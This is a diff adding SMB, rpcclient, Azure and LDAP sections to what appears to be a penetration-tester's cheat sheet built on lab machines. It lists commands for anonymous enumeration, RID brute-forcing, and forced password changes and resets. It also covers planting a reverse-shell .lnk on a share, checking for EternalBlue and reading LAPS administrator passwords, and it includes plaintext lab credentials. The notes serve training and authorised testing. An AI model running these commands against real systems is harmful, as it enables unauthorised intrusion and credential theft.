@@ -212,6 +212,10 @@ I try as much as possible to link to the various sources or inspiration for thes
     - [Notes](#notes-2)
     - [Manual Enumeration](#manual-enumeration)
     - [Initial foothold](#initial-foothold)
+    - [SMB](#smb)
+    - [rpcclient](#rpcclient)
+    - [Azure](#azure)
+    - [LDAP](#ldap)
     - [PowerView](#powerview)
     - [PsLoggedOn](#psloggedon)
     - [Service Principal Names Enumeration](#service-principal-names-enumeration)
@@ -5607,6 +5611,93 @@ Invoke-ShareFinder                                                              
   - [ ] See all sections of this document
   - [ ] See powershell history
   - [ ] Run Seatbelt first, then winPEAS
+
+
+#### <ins>SMB</ins>
+enumeration
+- `enum4linux -a -u "" -p "" 192.168.180.21`
+- `enum4linux -a -u "Guest" -p "" 192.168.180.21`
+- `sudo nmap -vvv -p 137 -sU --script=nbstat.nse 192.168.249.55`
+- `nmap -vvv -p 139,445 --script=smb* 192.168.180.21`
+- `crackmapexec smb 192.168.180.21 -u 'guest' -p ''`
+- `crackmapexec smb 192.168.220.240 -u '' -p '' --shares`
+  - see anon logins
+  - use flags `--shares` and `--rid-brute`
+- `crackmapexec smb 192.168.174.175 -u 'guest' -p ''`
+  - see anon logins
+  - use flags `--shares` and `--rid-brute` (`SidTypeUser` are users)
+- `smbmap -H 192.168.249.55`
+- `smbclient \\\\\192.168.249.55\\`
+- `smbclient -U '' -L \\\\\192.168.220.240\\`
+- `smbclient --no-pass -L //192.168.174.175`
+- `smbclient -L //192.168.174.175 -N`
+- `impacket-lookupsid vulnnet-rst.local/guest@10.10.146.39 > usernames.txt`
+- `cat usernames.txt | grep -i user | awk -F \\'{print $$2}' | awk '{print $1}'`	
+
+connect to share
+- `smbclient //192.168.207.116/IPC$`
+- `smbclient \\\\\192.168.212.172\\Shenzi`
+- `smbclient //192.168.203.172/DocumentsShare -U CRAFT2/thecybergeek`
+- If you find a suspicious share, try to upload a lnk file
+  - create a shortcut with the command for a reverse shell with `powercat.ps1`
+  - `cp link.lnk \\192.168.212.172\DocumentsShare`
+
+mount a share
+- `mount -t cifs "//10.10.10.103/Department Shares" /mnt`
+  `mount -t cifs -o username=amanda,password=Ashare1972 "//10.10.10.103/CertEnroll" /mnt`
+  - from the mounted share, see write perms:
+    `find . -type d | while read directory; do touch ${directory}/0xdf 2>/dev/null && echo "${directory} - write file" && rm ${directory}/0xdf; mkdir ${directory}/0xdf 2>/dev/null && echo "${directory} - write directory" && rmdir ${directory}/0xdf; done`
+  - see deleted files:
+    `touch {/mnt/ZZ_ARCHIVE/,./}0xdf.{lnk,exe,dll,ini}`
+
+exploitation
+- check if this smb hosts files of the web service, it might be possible to upload a shell
+- maybe it's possible to do phishing
+- `nmap -Pn -p445 --open --max-hostgroup 3 --script smb-vuln-ms17-010 192.168.174.187`
+  - CVE-2017-0143 EternalBlue
+  
+change password
+- If you find 'STATUS_PASSWORD_MUST_CHANGE': `smbpasswd -r $IP -U sbradley`
+- Alternativa: `impacket-smbpasswd -newpass testing1234 sbradley:roastpotatoes@10.10.95.8`
+
+
+#### <ins>rpcclient</ins>
+- rpcclient 192.168.180.20 -N
+- rpcclient 192.168.174.187 -U nik
+- rpcclient -U "" -N 10.10.10.172
+- Commands: enumdomusers, enumdomgroups, querydispinfo
+  - cat rpc_dump | awk '{print $1}' | cut -f2 -d [ | cut -f1 -d ] > ad_users.txt
+  - After enumdomusers, notes the `rid` values, then
+    `queryuser RID-HERE`, example `queryuser 0x1f4`
+- impacket-rpcdump @192.168.180.21
+- https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb/rpcclient-enumeration
+- Reset password: (see for svc_helpdesk accounts)
+  `setuserinfo2 username 23 password`
+
+
+
+#### <ins>Azure</ins>
+- https://blog.xpnsec.com/azuread-connect-for-redteam/
+- https://0xdf.gitlab.io/2020/06/13/htb-monteverde.html
+
+#### <ins>LDAP</ins>
+
+- `ldapsearch -v -x -b "DC=resourced,DC=local" -H "ldap://192.168.174.187" "(objectclass=*)"`
+  - check descriptions (you might find passwords in descriptions), enumerate users
+- `ldapsearch -v -c -D fmcsorley@HUTCH.OFFSEC -w CrabSharkJellyfish192 -b "DC=hutch,DC=offsec" -H ldap://192.168.212.175 "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd`
+  - to find Administrator password
+  - using creds `fmcsorley:CrabSharkJellyfish192` for domain `HUTCH.OFFSEC`
+- `ldapdomaindump -u 'htb.local\amanda' -p Ashare1972 10.10.10.103 -o ~/Downloads/ldap/`
+
+Domain Enumeration
+1. `python3 /home/kali/Documents/windows-attack/active_directory/windapsearch/windapsearch.py -u "" --dc-ip 10.10.10.172`
+2. `python3 /home/kali/Documents/windows-attack/active_directory/windapsearch/windapsearch.py -u "" --dc-ip 10.10.10.172 -U --admin-objects`
+   - Use the flag `--full` to get full results
+3. `python3 /home/kali/Documents/windows-attack/active_directory/windapsearch/windapsearch.py -u "" --dc-ip 10.10.10.172 -U | grep '@' | cut -d ' ' -f 2 | cut -d '@' -f 1 | uniq > users.txt`
+- You can also see wich elements belongs in a group
+  - `python3 /home/kali/Documents/windows-attack/active_directory/windapsearch/windapsearch.py -u "" --dc-ip 10.10.10.172 -U -m "Remote Management Users"`
+- Find possible passwords
+  - `python3 /home/kali/Documents/windows-attack/active_directory/windapsearch/windapsearch.py -u "" --dc-ip 10.10.10.182 -U --full | grep 'Pwd'`
 
 #### <ins>PsLoggedOn</ins>
 
